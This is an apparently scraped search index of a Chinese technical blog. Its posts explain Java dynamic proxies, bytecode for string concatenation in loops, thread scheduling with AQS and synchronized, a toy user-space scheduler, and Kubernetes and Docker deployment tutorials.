分析":" 分析环境: jdk8\ndynamic proxy 是啥？ A dynamic proxy class is a class that implements a list of interfaces1 specified at runtime such that a method invocation through one of the interfaces on an instance of the class will be encoded and dispatched to another object through a uniform interface2.\n动态代理类生成调用方法如下： Proxy.newProxyInstance(handler.getClass().getClassLoader(), new Class[]{Dynasty.class},handler); handler.getClass().getClassLoader() 运行时动态生成的代理类 load 到 jvm 使用的 class loader。 new Class[]{Dynasty.class} 运行时动态生成的代理类实现的一系列接口。 handler Invocation Handler 通过 invoke() 来分发方法，包含被实际代理的对象实例。 保存运行时生成的动态代理类ProxyGenerator.java /** debugging flag for saving generated class files */ private final static boolean saveGeneratedFiles = java.security.AccessController.doPrivileged( new GetBooleanAction( \"sun.misc.ProxyGenerator.saveGeneratedFiles\")).booleanValue(); 设置 sun.misc.ProxyGenerator.saveGeneratedFiles System.setProperty(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\"); 运行时生成的动态代理类($Proxy0)分析运行时生成的动态代理类实例化 $Proxy0 -\u003e Proxy(InvocationHandler h) 由此可见:\n动态代理类 $Proxy0 实例化时，调用 super class Proxy 的构造函数，需要的 InvocationHandler 是实现了该接口的 DynastyDynamicProxy DynastyDynamicProxy 实例化时，构造函数需要的是 TangDynasty 这个实际被代理的类。 运行时生成的动态代理类方法 $Proxy0 的命名 // prefix for all proxy class names private static final String proxyClassNamePrefix = \"$Proxy\"; // next number to use for generation of unique proxy class names private static final AtomicLong nextUniqueNumber = new AtomicLong(); $Proxy0#founder public final String founder() throws { try { return (String)super.h.invoke(this, m4, (Object[])null); // super.h.invoke 指的就是 DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } $Proxy0#reviver public final String reviver() throws { try { return (String)super.h.invoke(this, m5, (Object[])null); // super.h.invoke 指的就是 DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } $Proxy0#lastEmperor public final String lastEmperor() throws { try { return (String)super.h.invoke(this, m3, (Object[])null); // super.h.invoke 指的就是 DynastyDynamicProxy.invoke } catch (RuntimeException | Error var2) { throw var2; } catch (Throwable var3) { throw new UndeclaredThrowableException(var3); } } 由上可知，$Proxy0 实现的方法的统一调用入口(uniform interface) 就是 DynastyDynamicProxy#invoke，也就是 jdk 动态代理必须实现的 InvocationHandler#invoke 方法。\nInvocationHandler 接口实现类 DynastyDynamicProxy 分析 public class DynastyDynamicProxy implements InvocationHandler { // 被代理的对象 private Object delegate; public DynastyDynamicProxy(Object originalDynamic){ this.delegate = originalDynamic; } /** @param proxy 当前动态代理类 $Proxy0 的实例 @param method 当前动态代理类调用的方法 @param args 当前动态代理类调用的方法的参数 **/ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"公元 618 年唐朝建立!\"); String res = (String) method.invoke(delegate,args); System.out.println(method.getName() + \" of Tang Dynasty was \" + res + \"!\"); System.out.println(\"公元 907 年唐朝灭亡!\\n\"); return res; } } 被代理的类 TangDynasty 分析\npublic class TangDynasty implements Dynasty{ @Override public String founder() { return \"李渊\"; } @Override public String reviver() { return \"李隆基\"; } @Override public String lastEmperor() { return \"李柷\"; } } 由调用栈可知，最终还是要调用被代理的类的方法。 但是可以在执行真正的代理类方法之前，在 InvocationHandler#invoke 中添加实际需要的逻辑。这就是中间层，通过中间层进行逻辑的增强。 这样看起来就好像被代理对象的逻辑进行了增强。 ","设置-sunmiscproxygeneratorsavegeneratedfiles#设置 \u003ccode\u003esun.misc.ProxyGenerator.saveGeneratedFiles\u003c/code\u003e":"","运行时生成的动态代理类proxy0分析#运行时生成的动态代理类($Proxy0)分析":"","运行时生成的动态代理类实例化#运行时生成的动态代理类实例化":"","运行时生成的动态代理类方法#运行时生成的动态代理类方法":""},"title":"Java Jdk Proxy"},"/blog/java-keyword-volatile/":{"data":{"":"","references#References":" von-neumann-harvard-architecture out-of-order-execution(dynamic execution) Instruction_scheduling X86/GCC memory fence的一些见解 ","可见性问题#可见性问题":"","可见性问题思路#可见性问题思路":""},"title":"java-keyword-volatile"},"/blog/java-string-concat-in-loop/":{"data":{"main-字节码#main 字节码":" public static void main(java.lang.String[]); Code: 0: ldc #2 // String $ 2: astore_1 3: iconst_0 4: istore_2 5: iload_2 6: bipush 10 8: if_icmpge 36 11: new #3 // class java/lang/StringBuilder 14: dup 15: invokespecial #4 // Method java/lang/StringBuilder.\"\u003cinit\u003e\":()V 18: aload_1 19: invokevirtual #5 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 22: iload_2 23: invokevirtual #6 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 26: invokevirtual #7 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 29: astore_1 30: iinc 2, 1 33: goto 5 36: getstatic #8 // Field java/lang/System.out:Ljava/io/PrintStream; 39: aload_1 40: invokevirtual #9 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 43: return ","main-字节码执行图解分析#main 字节码执行图解分析":"\n由图可以看出，在外部定义的字符串变量 s，在 for 循环中和其他变量进行拼接，最终得到连接后的 s。\n循环的每一轮都会生成一个新的 StringBuilder 对象，进行两次 append 操作，append(s) 和 append(i)。最终这一轮的 s 是由 sb.toString() 得来的。\n如果循环次数是 1万次，需要创建的 StringBuilder 是 1 万个。这样是对性能肯定有影响的。短时间内产生大量的对象。","references#References":" https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.ldc https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.astore_n https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.iload_n https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.bipush https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.if_icmp_cond https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.new https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.iinc https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.getstatic https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html#jvms-6.5.invokevirtual ","分析代码#分析代码":" public class StringConcat { public static void main(String[] args) { String s = \"$\"; for (int i = 0; i \u003c 10; i++) { s += i; } System.out.println(s); } } ","分析环境#分析环境":"分析环境 jdk8","结论#结论":" 循环次数过多时，不要在循环里拼接需要的字符串。"},"title":"Java String Concat in Loop"},"/blog/java-thread-pool-params/":{"data":{"":"","references#References":" 你管这破玩意叫线程池 ","图解#图解":"","基本策略#基本策略":" 关注点分离，任务提交和执行分离。 延迟策略，延迟初始化。 "},"title":"Java Thread Pool Params"},"/blog/java-thread/":{"data":{"":"","aqs-和-os-关系#AQS 和 OS 关系":"","java-的线程由-os-scheduler-负责调度#java 的线程由 os scheduler 负责调度":"","synchronized-关键字和-os-关系#synchronized 关键字和 OS 关系":"","synchronized-用户空间优化思路#\u003ccode\u003esynchronized\u003c/code\u003e 用户空间优化思路":"java 的线程由 os scheduler 负责调度 Java thread scheduling is primarily managed by the operating system (OS) scheduler, but the Java Virtual Machine (JVM) and the application code can influence thread behavior in several ways.\njava 归根结底一个用户空间的程序而已。 实际的线程调度根本上还是由操作系统的调度器负责。 java 只是可以调整相应参数来影响线程的调度。 线程最终如何调度 java 无法决定。 OS Scheduler Dependency Native Threads: Modern JVMs use native threads (one-to-one mapping with OS threads). The OS scheduler is responsible for allocating CPU time to these threads based on its own algorithms (e.g., time-sharing, priority-based scheduling). Thread Lifecycle: The OS handles thread creation, scheduling, preemption, and termination. Even though Java provides abstractions like Thread and Runnable, the underlying OS controls execution. java 可以影响 Thread 行为 While the OS scheduler has ultimate authority, Java applications can influence thread behavior through:\nThread Priority 设置线程的优先级\nJava allows setting thread priorities (Thread.setPriority(int priority)), which are mapped to OS-specific priorities. Effect: Higher-priority threads may get more CPU time, but this is not guaranteed. OS policies (e.g., Linux’s Completely Fair Scheduler) may ignore or reinterpret Java priorities. Example: A thread with Thread.MAX_PRIORITY might run more frequently than one with Thread.MIN_PRIORITY, but the OS decides. Thread Yielding and Sleeping 放弃 CPU 的控制权/休眠\nThread.yield(): Hints to the OS scheduler that the current thread is willing to yield its CPU time. The scheduler may choose another thread of the same priority to run. Thread.sleep(long millis): Pauses the thread for a specified time, allowing other threads to execute. This indirectly affects scheduling by reducing contention. Synchronization and Blocking Synchronized blocks, locks (synchronized, ReentrantLock), and I/O operations (e.g., file/network I/O) can cause threads to block, triggering context switches managed by the OS. Contention for shared resources (e.g., locks) can lead to thread starvation or deadlocks, which the application must manage. Thread States and Lifecycle Application code controls thread states (e.g., start(), join(), interrupt()). For example: start(): start the thread join(): Causes one thread to wait for another’s completion. interrupt(): Signals a thread to stop, which the application must handle (e.g., via InterruptedException). Executor Framework and Thread Pools High-level concurrency utilities (java.util.concurrent) abstract thread management. Applications can configure thread pools (e.g., ThreadPoolExecutor) to control how tasks are scheduled, but the actual execution still depends on the OS scheduler. java 层面可以影响 os 调度器的参数总结 Aspect Controlled By Influenced By java Scheduling Algorithm OS (e.g., Linux CFS, Windows UMS) ❌ Thread Priority OS (mapped from Java priorities) ✅ (setPriority()) Yielding/Sleeping OS (honors hints) ✅ (yield(), sleep()) Blocking/Synchronization OS (context switches) ✅ (synchronized, I/O operations) Thread Creation/Lifecycle OS (via JVM) ✅ (start(), join(), interrupt()) In short, the OS scheduler ultimately controls thread execution, but application code can influence behavior through Java’s threading APIs, synchronization, and resource management. For fine-grained control, low-level OS tools or real-time systems are required.\nJVM and OS Interactions The JVM acts as an intermediary between Java code and the OS. It maps Java thread operations to OS-specific primitives (e.g., POSIX threads on Unix-like systems). Some JVM implementations may optimize thread scheduling (e.g., biased locking for synchronization), but these are OS-agnostic and still subject to OS-level scheduling. 说白了, jvm 再怎样优化终究是 userspace 代码, 内核不关心。 Limitations of Application Control No Direct Control: Java does not expose low-level OS scheduling policies (e.g., SCHED_FIFO or SCHED_RR in Linux). Applications cannot directly set real-time scheduling policies. Platform Variability: Thread behavior may differ across OSes (e.g., Windows vs. Linux) or JVM implementations (e.g., HotSpot vs. OpenJ9). Real-Time Java (RTSJ) For applications requiring deterministic scheduling (e.g., real-time systems), the Real-Time Specification for Java (RTSJ) provides stricter control over threads, but this requires a real-time JVM and OS support. AQS 和 OS 关系 The AbstractQueuedSynchronizer (AQS) is a foundational class in Java’s java.util.concurrent package that provides a framework for building synchronizers like locks (ReentrantLock), barriers (CyclicBarrier), latches (CountDownLatch), and semaphores (Semaphore). While the OS scheduler still governs thread execution, AQS introduces mechanisms to manage thread blocking/waking and fairness policies, which directly influence thread behavior and scheduling.\nHow AQS Works AQS manages synchronization by:\nState Management:\nUses a volatile int state to represent the synchronization state (e.g., lock count for ReentrantLock, remaining permits for Semaphore, or count for CountDownLatch). Threads attempt to modify this state atomically (via CAS operations like compareAndSetState). Wait Queue:\nMaintains a FIFO queue of waiting threads (as Node objects) when they fail to acquire the state. Threads in the queue are parked (blocked) using LockSupport.park() until signaled by another thread. Blocking and Waking:\nWhen a thread cannot acquire the state (e.g., a lock is held), AQS parks it (via LockSupport.park()), which transitions it to the WAITING or TIMED_WAITING state. When the state is released (e.g., a lock is unlocked), AQS unparks waiting threads (via LockSupport.unpark()) to retry acquiring the state. AQS 对 Thread Scheduling 的影响 AQS indirectly affects thread scheduling by:\nReducing Spurious Wakeups and Busy-Waiting:\nInstead of spinning (busy-waiting), AQS parks threads, allowing the OS scheduler to skip them until unparked. This reduces CPU usage and contention. Fairness Control:\nAQS supports both fair and unfair modes: Fair mode: Threads are granted access in FIFO order (queued). This ensures fairness but may reduce throughput due to frequent context switches. Unfair mode: Threads may “bypass” the queue if the state is available, improving throughput but risking starvation for waiting threads. Thread Blocking/Waking Coordination:\nAQS ensures that threads are woken up only when the synchronization state changes (e.g., a lock is released). This avoids unnecessary wakeups (unlike Object.notify() in intrinsic locks). Interruptible and Timed Waits:\nAQS allows threads to respond to interrupts (InterruptedException) or timeout during waits (e.g., tryLock(long timeout, TimeUnit)), giving applications finer control over thread behavior. Comparison to Intrinsic Locks (synchronized) Feature AQS (e.g., ReentrantLock) Intrinsic Lock (synchronized) Blocking Mechanism Uses LockSupport.park() Uses Object.wait()/notify() Fairness Configurable (fair/unfair) No fairness guarantees Interruptibility Supports InterruptedException Cannot interrupt waiting threads Timed Waits Supports timeouts (e.g., tryLock) No timeout support Performance Optimized for high contention Slower under high contention AQS-based synchronizers (like ReentrantLock) are generally more efficient and flexible than intrinsic locks, especially under high contention.\nUnderlying OS Interaction Parking/Unparking:\nLockSupport.park() and unpark() are implemented using OS-specific primitives:\nOn Linux: Uses futex (fast userspace mutex). On Windows: Uses WaitOnAddress or Condition Variables. These mechanisms allow threads to sleep/wakeup efficiently, managed by the OS scheduler. Context Switching:\nWhen a thread is parked, the OS scheduler removes it from the runnable queue. When unparked, it is re-added to the queue, triggering a context switch if necessary.\nExample: ReentrantLock and AQS ReentrantLock lock = new ReentrantLock(); lock.lock(); // Acquires the lock (may block) try { // Critical section } finally { lock.unlock(); // Releases the lock, unparks waiting threads } If the lock is unavailable, lock() calls AQS.acquire(), which: Attempts to acquire the state (e.g., sets state = 1 for the first lock). Fails → Adds the thread to the AQS queue. Parks the thread (OS scheduler skips it). When unlock() is called: Releases the state (e.g., sets state = 0). Unparks the next waiting thread in the queue. AQS 要点理解 AQS does not replace the OS scheduler but works with it to manage thread blocking/waking efficiently. Applications using AQS-based synchronizers can: Reduce contention by parking threads instead of spinning. 减少竞争, 让线程去 sleep Control fairness and timeouts. 控制获取锁的公平性和超时时间 Avoid deadlocks via interruptible waits. 可中断等待避免死锁 The OS still schedules threads when they are unparked, but AQS minimizes unnecessary scheduling overhead by managing the wait queue. 被唤醒后依旧由 os 负责调度 In essence, AQS abstracts the complexity of thread coordination, while the OS scheduler handles the actual execution of threads based on their state (runnable, parked, etc.).\nsynchronized 关键字和 OS 关系 Intrinsic locks (also known as monitor locks) are Java’s built-in synchronization mechanism, implemented using the synchronized keyword. They provide mutual exclusion and visibility guarantees but are less flexible and lower-level compared to synchronizers like AbstractQueuedSynchronizer (AQS).\nHow Intrinsic Locks Work Implicit Locking:\nEvery Java object has an intrinsic lock (monitor). When a thread enters a synchronized method or block:\nIt acquires the intrinsic lock associated with the object (e.g., this for instance methods, the class object for static methods). It releases the lock automatically when exiting the method/block (even if an exception is thrown). Blocking Behavior:\nIf a thread cannot acquire the lock (e.g., it’s held by another thread), it blocks until the lock becomes available. The JVM uses OS-specific mechanisms (e.g., Object.wait()/notify() internally) to manage blocked threads. Reentrancy:\nThreads can reacquire the same lock multiple times (e.g., nested synchronized calls). The lock is released only when the thread exits the outermost synchronized block/method. synchronized 对 Thread Scheduling 的影响 Intrinsic locks interact with the OS scheduler similarly to AQS-based synchronizers, but with key differences:\nAspect Intrinsic Locks (synchronized) AQS-Based Locks (e.g., ReentrantLock) Blocking Mechanism Uses Object.wait()/notify() internally Uses LockSupport.park()/unpark() Fairness No fairness guarantees Configurable (fair/unfair) Interruptibility Cannot interrupt waiting threads Supports InterruptedException Timed Waits No timeout support Supports timeouts (e.g., tryLock()) Performance Optimized in modern JVMs (biased locking) More efficient under high contention Limitations of Intrinsic Locks No Fairness Control:\nThreads waiting for the lock may be chosen arbitrarily by the JVM/OS, leading to potential starvation in high-contention scenarios. No Support for Try/Lock with Timeout:\nThreads cannot attempt to acquire the lock without blocking (e.g., tryLock()), nor can they specify a timeout. No Interruption Handling:\nThreads blocked on a synchronized lock cannot be interrupted (unlike AQS-based locks). This can lead to deadlocks if a thread holding the lock hangs or fails to release it. Coarse-Grained Control:\nLimited to mutual exclusion; no support for advanced synchronization patterns (e.g., read/write locks, condition variables with signal groups). Example: Intrinsic Lock Usage public class Counter { private int count = 0; // Acquires the intrinsic lock on 'this' public synchronized void increment() { count++; } // Acquires the intrinsic lock on 'this' public synchronized int getCount() { return count; } } If one thread is executing increment(), others must wait until it exits. No way to interrupt or time out the wait. When to Use Intrinsic Locks Simple Use Cases: For low-contention scenarios where simplicity and brevity are prioritized. Legacy Code: Older Java codebases often use synchronized due to historical reasons. Performance: Modern JVMs optimize intrinsic locks heavily (e.g., biased locking, lock coarsening), making them competitive with AQS-based locks in many cases. OS Scheduler Interaction When a thread blocks on an intrinsic lock, the JVM requests the OS to park the thread (similar to AQS, but via different mechanisms like Object.wait()). The OS scheduler removes the thread from the runnable queue until the lock is released and notify() is called. Context switches occur when threads are woken up, just like with AQS. 涉及到了内核 synchronized 要点理解 Intrinsic locks are simpler but less flexible than AQS-based synchronizers. AQS provides finer control over fairness, timeouts, and interruption handling, making it better suited for complex concurrency scenarios. Modern JVMs optimize intrinsic locks, so performance differences are often negligible unless dealing with high contention or requiring advanced features. For most new applications, prefer AQS-based utilities (ReentrantLock, Semaphore, etc.) unless simplicity is critical. For deeper control, use java.util.concurrent abstractions built on AQS.\nsynchronized 用户空间优化思路 The core ideas behind user-space optimizations for Java intrinsic locks (synchronized) revolve around minimizing the cost of synchronization by reducing reliance on expensive OS-level operations (like system calls or context switches). These optimizations exploit patterns in real-world code and runtime adaptability to make synchronization faster in common scenarios, while still falling back to kernel-level mechanisms only when necessary.\nUser-Space Lock 优化原则 1. Avoid Kernel Transitions (Fast Paths) Goal: Reduce or eliminate transitions to the OS kernel (e.g., futex waits, mutex operations) for uncontended locks. How: Use atomic instructions (e.g., Compare-and-Swap, or CAS) in user space for lock acquisition. Only escalate to OS-level blocking (e.g., park(), wait()) when contention is detected. Example: Lightweight locking avoids syscalls for uncontended locks. 2. Leverage Runtime Profiling and Adaptivity Goal: Dynamically adapt lock behavior based on observed runtime patterns. How: The JVM’s Just-In-Time (JIT) compiler and runtime monitor lock usage (e.g., frequency of contention, thread ownership). Apply optimizations like biased locking or adaptive spinning based on runtime data. Example: Biased locks are revoked only when contention occurs, saving overhead in single-threaded cases. 3. Reduce Lock Granularity Overhead Goal: Minimize the number of lock operations and their critical sections. How: Merge adjacent or closely spaced synchronized blocks (lock coarsening). Eliminate locks entirely for thread-local objects (lock elision via escape analysis). Trade-off: Balance between reducing overhead and avoiding overly large critical sections that increase contention. 4. Exploit Common Concurrency Patterns Goal: Optimize for typical usage patterns in Java applications. How: Assume locks are often uncontended (e.g., lightweight locking). Assume threads may reacquire the same lock (e.g., biased locking for reentrant access). Assume waits are often short-lived (e.g., adaptive spinning before parking). 优化类型和细节 1. Lightweight Locking (Fast Path) Uncontended Locks: Acquire a lock using a single CAS operation. If successful, no OS interaction is needed. Contended Locks: If CAS fails (another thread holds the lock), escalate to OS-level blocking (e.g., futex on Linux). Why It Works: Most locks in practice are uncontended, so the fast path avoids costly syscalls. 2. Biased Locking (Deprecated in Java 15+) Core Idea: Bias a lock toward a thread to eliminate atomic operations for reentrant access. Mechanism: Mark the object header with the thread ID of the first acquirer. Subsequent acquisitions by the same thread require only a thread ID check (no CAS). Trade-off: Fast for single-threaded access but adds overhead for revocation under contention. 3. Lock Coarsening Core Idea: Merge adjacent synchronized blocks to reduce lock/unlock overhead. Example: synchronized(lock) { doA(); } synchronized(lock) { doB(); } → Merged into: synchronized(lock) { doA(); doB(); } Why It Helps: Reduces the number of lock operations and avoids unnecessary context switches. 4. Lock Elision (Escape Analysis) Core Idea: Remove locks entirely if the locked object is proven to be thread-local. Mechanism: The JIT compiler analyzes object scope to determine if it escapes the current thread. If not, synchronization is removed. Example: void method() { Object localLock = new Object(); synchronized(localLock) { /* Lock elided */ } } 5. Adaptive Spinning Core Idea: Spin (busy-wait) briefly before parking a blocked thread, assuming the lock may become available soon. How: The spin count adapts dynamically based on historical contention (e.g., spin longer if the lock was recently contended). Why It Helps: Avoids the cost of parking/unparking threads for short waits. 为什么优化会有用? Most Locks Are Uncontended:\nStudies show ~90% of locks are uncontended in real-world applications. Lightweight locking and biased locking optimize this common case. 锁大多数时候没有竞争 Thread Reentrancy:\nApplications often reacquire the same lock (e.g., recursive method calls). Biased locking reduces overhead for reentrant access. 获取锁后, 会再次获取同一个锁 Short Critical Sections:\nCritical sections are often small (e.g., incrementing a counter). Adaptive spinning avoids context switches for short waits. 临界区很短, 没有获取到的锁的线程可以先自旋一会, 很大可能可以成功获取锁 Thread-Local Data:\nMany objects are never shared across threads. Escape analysis eliminates synchronization overhead for such cases. 大多数对象在线程间不共享 Trade-offs and Limitations Optimization Pros Cons Lightweight Locking Fast uncontended case 不竞争快速获取锁 Falls back to OS for contention 竞争 os 就要干预了 Biased Locking Zero-cost reacquisition 重新获取锁没有消耗 Revocation overhead under contention Lock Coarsening Reduces lock operations 减少获取锁的操作 May increase critical section size 临界区变长 Lock Elision Eliminates sync overhead Limited to thread-local objects Adaptive Spinning Avoids context switches 自旋一会, 也就是 busy-wait Wastes CPU cycles for long waits 浪费一些 CPU 时间 结论 The core idea is to handle synchronization efficiently in user space whenever possible, using runtime adaptability and pattern recognition to minimize reliance on the kernel. 在用户空间高效处理同步, 尽量不要惊动 OS 内核, 一旦涉及内核代价较高 基于哪些事实在优化? Most locks are uncontended. Threads often reacquire locks. Critical sections are small. By focusing on these patterns, modern JVMs make intrinsic locks (synchronized) competitive with AQS-based locks for many use cases, while still providing the safety and simplicity of built-in synchronization. For high-contention scenarios or advanced features (e.g., fairness, timeouts), AQS-based locks remain superior."},"title":"Java Thread"},"/blog/java-user-space-schedule/":{"data":{"driver-class#Driver class":" public class Main { public static void main(String[] args) { UserSpaceScheduler scheduler = new UserSpaceScheduler(); scheduler.addTask(new Task(\"Task A\", 3)); scheduler.addTask(new Task(\"Task B\", 5)); scheduler.addTask(new Task(\"Task C\", 2)); scheduler.run(); } } ","task-自定义的任务#Task 自定义的任务":" public class Task { private String name; private int steps; public Task(String name, int steps) { this.name = name; this.steps = steps; } public boolean runStep() { if (steps \u003c= 0) return false; // Task is done System.out.println(name + \" is running. Steps left: \" + steps); steps--; return true; // Task has more work } } ","举例理解#举例理解":" A user-space scheduler manages tasks or “threads” entirely within an application, without relying on the operating system (OS) scheduler. This is different from kernel-level scheduling, where the OS manages threads. 什么是用户态调度？可以简单理解为自定义一堆任务, 由用户决定怎样执行这些任务。不涉及操作系统的进程/线程调度。\n举例理解","如何工作#如何工作":"Cooperative Multitasking Tasks are not OS threads. They are objects managed in a queue. 不是 OS 的线程\nExplicit Yielding The scheduler runs each task for one “step,” then moves to the next. Tasks don’t block—they voluntarily give up control.\nNo OS Involvement The OS sees only the main thread running scheduler.run().","自定义的调度#自定义的调度":" import java.util.LinkedList; import java.util.Queue; public class UserSpaceScheduler { // 以 FIFO 顺序执行 Task private Queue\u003cTask\u003e taskQueue = new LinkedList\u003c\u003e(); public void addTask(Task task) { taskQueue.add(task); } public void run() { while (!taskQueue.isEmpty()) { Task task = taskQueue.poll(); boolean hasMoreWork = task.runStep(); if (hasMoreWork) { // deciding which task runs next taskQueue.add(task); // Re-add to the queue if not done } } } } "},"title":"Java User Space Schedule"},"/blog/js-eventloop/":{"data":{"":"","references#References":" understanding-the-event-loop-callbacks-promises-and-async-await-in-javascript learning-functional-programming-with-javascript what is event loop?js-conf what is event loop demo an-introduction-to-functional-programming how-javascript-works-in-browser-and-node 浏览器提供 Web Apis "},"title":"js-eventloop"},"/blog/k8s-deploy-container-using-yaml/":{"data":{"":"kubernetes 作为一个云上的操作系统，要想充分利用，就要了解 kubernetes 提供的功能。告诉系统要搞啥，k8s 帮你搞定这一切，归根结底，不开发 k8s 就是一个 k8s 的用户，知道 k8s 能具体做啥，写好 YAML 就可以。","references#References":" https://www.katacoda.com/courses/kubernetes/kubectl-run-containers apiversion what is k8s deployment? ","如何在-k8s-上部署服务#如何在 k8s 上部署服务":"create Deployment One of the most common Kubernetes object is the deployment object. The deployment object defines the container spec required, along with the name and labels used by other parts of Kubernetes to discover and connect to the application.\n准备 deployment.yaml The definition defines how to launch an application called webapp1 using the Docker Image katacoda/docker-http-server that runs on Port 80.\napiVersion: apps/v1 kind: Deployment # object type metadata: name: webapp1 spec: replicas: 1 selector: matchLabels: app: webapp1 template: metadata: labels: app: webapp1 spec: containers: - name: webapp1 image: katacoda/docker-http-server:latest ports: - containerPort: 80 部署到 k8s 中 kubectl create -f `deployment.yaml` 查看所有 deployment kubectl get deployment 查看某一个 deployment kubectl describe deployment `webapp1` create Service kubernetes has powerful networking capabilities that control how applications communicate. These networking configurations can also be controlled via YAML.\n准备 service.yaml The Service selects all applications with the label webapp1. As multiple replicas, or instances, are deployed, they will be automatically load balanced based on this common label. The Service makes the application available via a NodePort.\napiVersion: v1 kind: Service metadata: name: webapp1-svc labels: app: webapp1 spec: type: NodePort ports: - port: 80 nodePort: 30080 selector: app: webapp1 部署到 k8s 中 kubectl create -f `service.yaml` 查看所有 service kubectl get svc 查看某一个 deployment kubectl describe svc `webapp1-svc` scale Deployment 配置 replicas apiVersion: apps/v1 kind: Deployment # object type metadata: name: webapp1 spec: replicas: 4 # selector: matchLabels: app: webapp1 template: metadata: labels: app: webapp1 spec: containers: - name: webapp1 image: katacoda/docker-http-server:latest ports: - containerPort: 80 "},"title":"k8s-deploy-container-using-yaml"},"/blog/katacoda-building-docker-image/":{"data":{"base-images#Base images":" All Docker images start from a base image. A base image is the same images from the Docker Registry which are used to start containers. Along with the image name, we can also include the image tag to indicate which particular version we want, by default, this is latest. These base images are used as the foundation for your additional changes to run your application. For example, in this scenario, we require NGINX to be configured and running on the system before we can deploy our static HTML files. As such we want to use NGINX as our base image. Dockerfile’s are simple text files with a command on each line. To define a base image we use the instruction FROM image-name:tag\nFROM nginx:1.11-alpine ","building-containers#Building containers":" After writing your Dockerfile you need to use docker build to turn it into an image. The build command takes in a directory containing the Dockerfile, executes the steps and stores the image in your local Docker Engine. If one fails because of an error then the build stops. Using the docker build command to build the image. You can give the image a friendly name by using the -t name option.\ndocker build -t my-nginx-image:latest \u003eSending build context to Docker daemon 3.072kB Step 1/5 : FROM nginx:1.11-alpine ---\u003e bedece1f06cc Step 2/5 : COPY index.html /usr/share/nginx/html/index.html ---\u003e Using cache ---\u003e 2be98924804a Step 3/5 : EXPOSE 80 ---\u003e Using cache ---\u003e 233ea4308326 Step 4/5 : CMD [\"nginx\", \"-g\", \"daemon off;\"] ---\u003e Using cache ---\u003e 1a518260bb2b Step 5/5 : CMD [\"nginx\", \"-g\", \"daemon off;\"] ---\u003e Using cache ---\u003e 563c68c52ed7 Successfully built 563c68c52ed7 Successfully tagged my-nginx-image:latest ","default-commands#Default commands":" With the Docker image configured and having defined which ports we want accessible, we now need to define the command that launches the application. The CMD line in a Dockerfile defines the default command to run when a container is launched. If the command requires arguments then it’s recommended to use an array, for example [“cmd”, “-a”, “arga value”, “-b”, “argb-value”], which will be combined together and the command *cmd -a “arga value” -b argb-value would be run. An alternative approach to CMD is ENTRYPOINT. While a CMD can be overridden when the container starts, a ENTRYPOINT defines a command which can have arguments passed to it when the container launches.\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html # web server to be accessible via port 80 EXPOSE 80 # The command to run NGINX is nginx -g daemon off; CMD [\"nginx\", \"-g\", \"daemon off;\"] ","exposing-ports#Exposing ports":" With our files copied into our image and any dependencies downloaded, you need to define which port application needs to be accessible on. Using the EXPOSE port command you tell Docker which ports should be open and can be bound too. You can define multiple ports on the single command, for example, EXPOSE 80 433 or EXPOSE 7000-8000\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html # web server to be accessible via port 80 EXPOSE 80 ","launching-new-image#Launching new image":" NGINX is designed to run as a background service so you should include the option -d. To make the web server accessible, bind it to port 80 using p 80:80\ndocker run -d -p 80:80 my-nginx-image:latest access the launched web server via the hostname docker. the command curl -i http://docker will return our index file via NGINX and the image we built.\ncurl -i http://docker ","running-commands#Running commands":" With the base image defined, we need to run various commands to configure our image. There are many commands to help with this, the main commands two are COPY and RUN. RUN command allows you to execute any command as you would at a command prompt, for example installing different application packages or running a build command. The results of the RUN are persisted to the image so it’s important not to leave any unnecessary or temporary files on the disk as these will be included in the image. COPY src dest allows you to copy files from the directory containing the Dockerfile to the container’s image. This is extremely useful for source code and assets that you want to be deployed inside your container *A new index.html file has been created for you which we want to serve from our container. On the next line after the FROM command, use the COPY command to copy index.html into a directory called **/usr/share/nginx/*html\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html ","steps#steps":" Docker images are built based on a Dockerfile. A Dockerfile defines all the steps required to create a Docker image with your application configured and ready to be run as a container. The image itself contains everything, from operating system to dependencies and configuration required to run your application. Having everything within the image allows you to migrate images between different environments and be confident that if it works in one environment, then it will work in another. The Dockerfile allows for images to be composable, enabling users to extend existing images instead of building from scratch. By building on an existing image, you only need to define the steps to setup your application. The base images can be basic operating system installations or configured systems which simply need some additional customisations.\nsteps"},"title":"building-docker-image"},"/blog/katacoda-deploy-static-website/":{"data":{"build-docker-image#Build docker image":" The Dockerfile is used by the Docker CLI build command. The build command executes each instruction within the Dockerfile. The result is a built Docker Image that can be launched and run your configured app. The build command takes in some different parameters. The format is docker build -t build-directory. The -t parameter allows you to specify a friendly name for the image and a tag, commonly used as a version number. This allows you to track built images and be confident about which version is being started.\n# Build our static HTML image using the build command below. # The built image will have the name webserver-image with a tag of v1. docker build -t webserver-image:v1 . # view a list of all the images on the host docker images ","create-a-dockerfile#Create a Dockerfile":"Create a Dockerfile Docker Images start from a base image. The base image should include the platform dependencies required by your application, for example, having the JVM or CLR installed. This base image is defined as an instruction in the Dockerfile. Docker Images are built based on the contents of a Dockerfile. The Dockerfile is a list of instructions describing how to deploy your application.\n# base image FROM nginx:alpine # copies the content of the current directory into a particular location 